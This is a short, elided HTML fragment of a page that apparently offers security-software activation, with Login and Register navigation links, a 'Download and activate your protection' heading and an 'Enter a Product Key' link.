...
<nav class="navbar navbar-color" style="min-height:57px; z-index:10;">
  <div class="container">
    ...
    <ul class="nav navbar-nav navbar-center">
	    ...
	    <li class="btn btn-lg nav-btn"><a href="mcalog/index.php">Login</a></li>
	    <li class="btn btn-lg nav-btn"><a href="mcareg/index.php">Register</a></li>
...
<div class="home-slider">
	...
	<h4 class="slider-cnt-position1">Download and activate your protection</h4>
</div>
<a href="act-mca.php" class="slider-cnt-position2" value="snjdf">Enter a Product Key</a>
